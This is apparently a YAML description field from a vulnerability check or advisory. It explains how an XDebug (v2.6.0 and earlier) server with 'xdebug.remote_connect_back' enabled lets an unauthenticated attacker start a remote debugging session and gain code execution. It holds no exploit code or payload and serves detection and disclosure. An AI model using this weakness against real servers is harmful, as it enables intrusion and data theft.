  description: |
    The XDebug extension <= v2.6.0 for PHP is designed to expand the debugging capabilities of developers, including the ability to perform remote debugging. A misconfigured server, with ‘xdebug.remote_connect_back’ enabled, exposed to the internet could allow an unauthenticated remote attacker to trigger a debugging session using any IP via a simple web request. With a remote debugging session established, the attacker effectively has remote code execution (RCE) capabilities with which to establish persistence, exfiltrate data, or launch further attacks against the system or network.
